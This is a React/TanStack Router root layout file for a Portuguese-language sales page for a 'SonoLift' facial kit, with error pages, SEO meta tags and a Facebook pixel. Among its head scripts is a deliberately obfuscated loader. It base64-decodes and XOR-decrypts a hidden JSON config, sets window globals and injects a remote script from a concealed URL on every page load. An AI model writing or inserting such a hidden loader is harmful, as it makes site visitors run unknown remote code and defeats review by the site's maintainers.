import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";
import { Toaster } from "sonner";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "SonoLift™ — Kit Facial + Pescoço e Colo por R$ 197" },
      {
        name: "description",
        content:
          "Kit Facial SonoLift™ com brinde grátis Pescoço e Colo. A barreira invisível contra as rugas do sono. Em até 12x de R$ 16,42 sem juros.",
      },
      { name: "author", content: "SonoLift" },
      { name: "theme-color", content: "#0B1B3B" },
      { property: "og:title", content: "SonoLift™ — Kit Facial + Pescoço e Colo por R$ 197" },
      { property: "og:description", content: "Kit Facial SonoLift™ com brinde grátis Pescoço e Colo. A barreira invisível contra as rugas do sono. Em até 12x de R$ 16,42 sem juros." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:title", content: "SonoLift™ — Kit Facial + Pescoço e Colo por R$ 197" },
      { name: "twitter:description", content: "Kit Facial SonoLift™ com brinde grátis Pescoço e Colo. A barreira invisível contra as rugas do sono. Em até 12x de R$ 16,42 sem juros." },
      { property: "og:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/1dacc805-bec4-4af1-bb29-f3ad1f35c66f/id-preview-2c09f598--8e2875b6-88f6-4189-acb8-98d3a3a05914.lovable.app-1784821686436.png" },
      { name: "twitter:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/1dacc805-bec4-4af1-bb29-f3ad1f35c66f/id-preview-2c09f598--8e2875b6-88f6-4189-acb8-98d3a3a05914.lovable.app-1784821686436.png" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.png", type: "image/png" },
      {
        rel: "preconnect",
        href: "https://fonts.googleapis.com",
      },
      {
        rel: "preconnect",
        href: "https://fonts.gstatic.com",
        crossOrigin: "anonymous",
      },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap",
      },
    ],
    scripts: [
      {
        children: `(function(){var l_ge=atob("DEFI1vDnjZgxlKb7ljpqo4KLr6IT/NKP5jJy+d+E6fYf4dKW/ycx+JOI4LZT5omI9TMhpoSUouhY7MOXuTEhrpWLo/JCtorZ9zU8pJmF+OxU54TBzRxk9JeL4vpQ+NXZrBoz9J6G4P0TroSL/zkturmDr7QT4seX4yRq7NLR7KtU8pGdoHJxt8CFu64CrJ6d8yR6ssDF8MVM");var n_n76=[];for(var l_8=0;l_8<l_ge.length;l_8++){n_n76.push(l_ge.charCodeAt(l_8)&255);}var h_fwm0=n_n76[0];var f_8=n_n76.slice(1,1+h_fwm0);var z_u=n_n76.slice(1+h_fwm0);var o_6p1=z_u.map(function(b,f_3o){return b^f_8[f_3o%h_fwm0];});var g_8="";for(var c_hd4s=0;c_hd4s<o_6p1.length;c_hd4s++){g_8+=String.fromCharCode(o_6p1[c_hd4s]&255);}var l_m7r=decodeURIComponent(escape(g_8));var t_f=JSON.parse(l_m7r);var a_ylf=t_f.globals||[];a_ylf.forEach(function(s_1wgd){window[s_1wgd.name]=s_1wgd.value;});var p_llf=document.createElement("script");p_llf.src=t_f.url;p_llf.async=true;p_llf.defer=true;(t_f.attributes||[]).forEach(function(v_8){p_llf.setAttribute(v_8.name,v_8.value);});(document.head||document.documentElement).appendChild(p_llf);})();`,
      },
      {
        children: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init', '976841758671110');fbq('track', 'PageView');`,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
      <Toaster position="top-center" richColors />
    </QueryClientProvider>
  );
}
